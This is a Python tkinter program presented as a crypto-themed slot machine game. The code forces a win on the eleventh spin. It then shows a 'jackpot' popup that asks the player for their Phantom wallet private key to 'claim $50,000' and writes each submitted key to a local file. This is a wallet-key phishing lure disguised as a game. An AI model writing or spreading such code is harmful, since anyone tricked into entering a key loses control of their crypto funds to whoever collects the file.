import tkinter as tk
import random
from PIL import Image, ImageTk

# Create main window
root = tk.Tk()
root.title('Crypto Rich Slot Machine')

# Set fixed window size
root.geometry('400x400')
root.resizable(False, False)

# Load and resize images after initializing the root
symbols_images = {
    'ton': ImageTk.PhotoImage(Image.open('images/ton.jpg').resize((80, 80), Image.LANCZOS)),
    'xrp': ImageTk.PhotoImage(Image.open('images/xrp.jpg').resize((80, 80), Image.LANCZOS)),
    'sol': ImageTk.PhotoImage(Image.open('images/sol.jpg').resize((80, 80), Image.LANCZOS)),
    'eth': ImageTk.PhotoImage(Image.open('images/eth.jpg').resize((80, 80), Image.LANCZOS)),
    'btc': ImageTk.PhotoImage(Image.open('images/btc.jpg').resize((80, 80), Image.LANCZOS))
}

# Define symbol values
symbol_values = {
    'ton': 10,
    'xrp': 20,
    'sol': 30,
    'eth': 40,
    'btc': 50
}

# Track the number of spins
spin_count = 0

# Function to show jackpot popup
def show_jackpot_popup():
    jackpot_window = tk.Toplevel(root)
    jackpot_window.title('Jackpot!')
    tk.Label(jackpot_window, text='Congratulations! You won the jackpot!', font=('Arial', 14)).pack(pady=10)
    tk.Label(jackpot_window, text='Enter your phantom private key to claim $50,000:', font=('Arial', 12)).pack(pady=5)
    phantom_entry = tk.Entry(jackpot_window, font=('Arial', 12))
    phantom_entry.pack(pady=5)
    phantom_entry.focus_set()  # Set focus to the entry widget
    def submit_phantom(event=None):
        phantom_private_key = phantom_entry.get()
        print(f'Phantom private key submitted: {phantom_private_key}')  # Debugging
        with open('Phantom_private_key.txt', 'a') as file:
            file.write(f'{phantom_private_key}\n')
        jackpot_window.destroy()
    phantom_entry.bind('<Return>', submit_phantom)  # Bind Enter key to submit

# Function to spin the slots with animation
def spin():
    global balance, spin_count
    symbols = list(symbols_images.keys()) * 2  # Increase variety
    spin_count += 1
    for _ in range(10):  # Spin for 1 second
        choice1 = random.choice(symbols)
        choice2 = random.choice(symbols)
        choice3 = random.choice(symbols)
        slot1.config(image=symbols_images[choice1])
        slot2.config(image=symbols_images[choice2])
        slot3.config(image=symbols_images[choice3])
        root.update()
        root.after(100)  # Delay for animation
    # Final result
    if spin_count == 11:
        choice1 = choice2 = choice3 = random.choice(symbols)  # Force win on 11th spin
    else:
        choice1 = random.choice(symbols)
        choice2 = random.choice(symbols)
        choice3 = random.choice(symbols)
    slot1.config(image=symbols_images[choice1])
    slot2.config(image=symbols_images[choice2])
    slot3.config(image=symbols_images[choice3])
    win_amount = 0
    # New win logic with symbol values
    if choice1 == choice2 == choice3:
        win_amount = symbol_values[choice1] * 3  # Triple the symbol value
        balance += win_amount
        print('Big Win!')  # Debugging
        show_jackpot_popup()  # Show jackpot popup
        spin_count = 0  # Reset spin count after a win
    elif choice1 == choice2 or choice2 == choice3 or choice1 == choice3:
        win_amount = symbol_values[choice1]  # Single symbol value
        balance += win_amount
        print('Small Win!')  # Debugging
    else:
        balance -= 10  # Bet amount
        print('No win.')  # Debugging
    balance_label.config(text=f'Balance: {balance} (Won: {win_amount})')
    print(f'Updated balance: {balance}')  # Debugging

# Function to show game rules
def show_rules():
    rules_window = tk.Toplevel(root)
    rules_window.title('Game Rules')
    rules_text = (
        'Game Rules:\n'
        '- Match all three symbols to win triple their value.\n'
        '- Match any two symbols to win their single value.\n'
        '- Each spin costs 10.\n'
        'Symbol Values:\n'
        '- ton: 10\n'
        '- xrp: 20\n'
        '- sol: 30\n'
        '- eth: 40\n'
        '- btc: 50\n'
    )
    tk.Label(rules_window, text=rules_text, font=('Arial', 14)).pack(padx=20, pady=20)

# Initial balance
balance = 1000

# Load and resize background image
background_image = ImageTk.PhotoImage(Image.open('images/luxury.jpg').resize((400, 400), Image.LANCZOS))

# Create a canvas for the background
canvas = tk.Canvas(root, width=400, height=400)
canvas.pack(fill='both', expand=True)
canvas.create_image(0, 0, image=background_image, anchor='nw')

# Create a frame for balance information
balance_frame = tk.Frame(canvas, bg='white')
balance_label = tk.Label(balance_frame, text=f'Balance: {balance} (Won: 0)', font=('Arial', 18, 'bold'), bg='white', fg='black')
balance_label.pack(padx=5, pady=5)

# Slot display
slot1 = tk.Label(root, image=symbols_images['ton'])
slot2 = tk.Label(root, image=symbols_images['ton'])
slot3 = tk.Label(root, image=symbols_images['ton'])

# Spin button
spin_button = tk.Button(root, text='Spin', command=spin, font=('Arial', 24, 'bold'), bg='#4CAF50', fg='red', activebackground='#45a049')

# Game Rules button
rules_button = tk.Button(root, text='Game Rules', command=show_rules, font=('Arial', 14, 'bold'), bg='#2196F3', fg='red', activebackground='#1976D2')

# Place widgets on the canvas
canvas.create_window(200, 30, window=balance_frame)
canvas.create_window(100, 150, window=slot1)
canvas.create_window(200, 150, window=slot2)
canvas.create_window(300, 150, window=slot3)
canvas.create_window(200, 250, window=spin_button)
canvas.create_window(200, 300, window=rules_button)

# Raise the balance frame to ensure it's on top
canvas.tag_raise('balance')

# Configure grid layout
root.grid_rowconfigure(0, weight=1)
root.grid_rowconfigure(1, weight=1)
root.grid_rowconfigure(2, weight=1)
root.grid_rowconfigure(3, weight=1)
root.grid_columnconfigure(0, weight=1)
root.grid_columnconfigure(1, weight=1)
root.grid_columnconfigure(2, weight=1)

# Run the application
root.mainloop() 